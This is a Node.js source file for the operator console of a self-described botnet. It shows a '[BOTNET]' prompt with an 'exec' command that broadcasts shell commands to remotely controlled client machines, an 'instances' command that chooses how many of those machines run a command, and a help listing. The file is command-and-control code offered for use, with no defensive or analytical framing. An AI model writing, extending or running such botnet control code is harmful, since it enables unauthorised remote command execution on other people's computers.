import readline from "readline";
const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
});
import fs from "fs";
import { clientModules, broadcast } from "./server.js"

const help = fs.readFileSync("../config/help", "utf8");

const commandsHelp = [
	{
		command: "exec",
		functionality: "Executes shell commands remotely",
		usage: "exec <command>",
	},
	{
		command: "instances",
		functionality: "Limits number of machines running a command",
		usage: "instances <number>",
	},
	{
		command: "help",
		functionality: "Shows you how to use commands",
		usage: "help <command>",
	},
];

export default function prompt() {
	rl.question("[BOTNET] ", (message) => {
		message = message.toLowerCase();

		if (message === "instances") {
			console.log(`Instances: ${clientModules.clientInstances.length}`);
		}

		if (message.startsWith("instances")) {
			if (message.split(" ")[1] <= clientModules.clients.length) {
				clientModules.clientInstances = [...clientModules.clients];
				clientModules.clientInstances = clientModules.clientInstances.slice(0, message.split(" ")[1]);
			}
		}

		if (message.split(" ")[1] === "all") clientModules.clientInstances = [...clientModules.clients];

		if (message === "help") console.log(`\n${help}`);

		if (message.startsWith("help")) {
			if (
				commandsHelp.filter((i) => i.command === message.split(" ")[1]).length >
				0
			) {
				let commandIndex = commandsHelp
					.map((i) => i.command)
					.indexOf(message.split(" ")[1]);

				console.log(
					`Functionality: ${commandsHelp[commandIndex].functionality}\nUsage: ${commandsHelp[commandIndex].usage}\n`
				);
			}
		}

		if (message.startsWith("exec")) broadcast(message);

		return prompt();
	});
}
